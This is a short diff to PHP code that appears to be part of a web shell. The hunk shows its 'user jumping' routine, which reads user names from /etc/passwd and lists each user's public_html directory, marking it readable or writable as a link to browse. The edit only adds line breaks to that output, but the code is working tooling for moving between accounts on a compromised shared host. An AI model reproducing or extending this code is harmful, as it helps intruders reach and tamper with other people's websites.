@@ -387,9 +387,9 @@ if($passwd == '' || !$etc) {
        $user_jumping_dir = "/home/$user_jefri_jump/public_html";
        if(is_readable($user_jumping_dir)) {
            $i++;
-           $jrw = "{ <font color=#52CF38>R</font>} <a href='?dir=$user_jumping_dir'><font color=#D0D5D5>$user_jumping_dir</font></a>";
+           $jrw = "{ <font color=#52CF38>R</font>} <a href='?dir=$user_jumping_dir'><font color=#D0D5D5>$user_jumping_dir</font></a><br>";
            if(is_writable($user_jumping_dir)) {
-               $jrw = "{ <font color=#52CF38>RW</font> }<a href='?dir=$user_jumping_dir'><font color='white'>$user_jumping_dir</font></a>";
+               $jrw = "{ <font color=#52CF38>RW</font> }<a href='?dir=$user_jumping_dir'><font color='white'>$user_jumping_dir</font></a><br>";
            }
            echo $jrw;
            if(function_exists('posix_getpwuid')) {
